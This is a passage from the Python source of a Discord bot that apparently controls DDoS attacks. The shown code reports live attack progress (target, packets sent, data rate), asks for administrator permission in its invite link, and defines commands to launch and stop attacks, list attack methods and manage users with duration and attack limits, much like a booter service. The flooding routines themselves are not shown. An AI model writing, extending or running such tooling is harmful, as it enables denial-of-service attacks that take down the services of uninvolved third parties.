            timestamp=datetime.now()
        )
        
        embed.add_field(name="🎯 Target", value=session.target, inline=True)
        embed.add_field(name="⚡ Method", value=session.method, inline=True)
        embed.add_field(name="⏱️ Duration", value=f"{duration:.0f}s", inline=True)
        embed.add_field(name="📦 Packets Sent", value=str(session.packets_sent), inline=True)
        embed.add_field(name="💾 Data Sent", value=format_bytes(session.data_sent), inline=True)
        embed.add_field(name="🚀 Packet Rate", value=f"{packet_rate:.0f}/s", inline=True)
        embed.add_field(name="📊 Data Rate", value=f"{format_bytes(int(data_rate))}/s", inline=True)
        
        embed.set_footer(text=f"Update {update_count + 1}/{max_updates} - Use !ddos stop {session_id[:8]} to stop")
        
        await ctx.send(embed=embed)
        update_count += 1

# ==================== Discord Bot Setup ====================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=config.COMMAND_PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot is now running as {bot.user}")
    print(f"🔗 Invite URL: https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8")
    print("\n📋 Available Commands:")
    print(f"  {config.COMMAND_PREFIX} attack <target> <method> [threads] [duration]")
    print(f"  {config.COMMAND_PREFIX} stop <session_id/all>")
    print(f"  {config.COMMAND_PREFIX} status")
    print(f"  {config.COMMAND_PREFIX} stats")
    print(f"  {config.COMMAND_PREFIX} methods")
    print(f"  {config.COMMAND_PREFIX} help")
    print("\n⚡ Bot is ready!")

@bot.command(name="attack")
async def attack_command(ctx, target: str, method: str, threads: int = None, duration: str = None):
    """Start a DDoS attack"""
    await handle_attack(ctx, target, method, threads, duration)

@bot.command(name="stop")
async def stop_command(ctx, session_id: str = None):
    """Stop an attack"""
    await handle_stop(ctx, session_id)

@bot.command(name="status")
async def status_command(ctx):
    """Check attack status"""
    await handle_status(ctx)

@bot.command(name="stats")
async def stats_command(ctx):
    """Check system stats"""
    await handle_stats(ctx)

@bot.command(name="adduser")
async def adduser_command(ctx, user_id: str, max_duration: str = None, attack_limit: str = None):
    """Add a user (admin only)"""
    await handle_adduser(ctx, user_id, max_duration, attack_limit)

@bot.command(name="removeuser")
async def removeuser_command(ctx, user_id: str):
    """Remove a user (admin only)"""
    await handle_removeuser(ctx, user_id)

@bot.command(name="listusers")
async def listusers_command(ctx):
    """List all users (admin only)"""
    await handle_listusers(ctx)

@bot.command(name="methods")
async def methods_command(ctx):
    """Show attack methods"""
    await handle_methods(ctx)

@bot.command(name="help")
async def help_command(ctx):
    """Show help"""
    await handle_help(ctx)

# ==================== Main Function ====================
async def main():
    """Main function"""
    print("🚀 Starting DDoS Discord Bot...")
    
    # Initialize bot configuration
    if not init_bot():
        return
    
    # Run the bot
    try:
        async with bot:
            await bot.start(config.BOT_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid bot token. Please check your DISCORD_BOT_TOKEN.")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())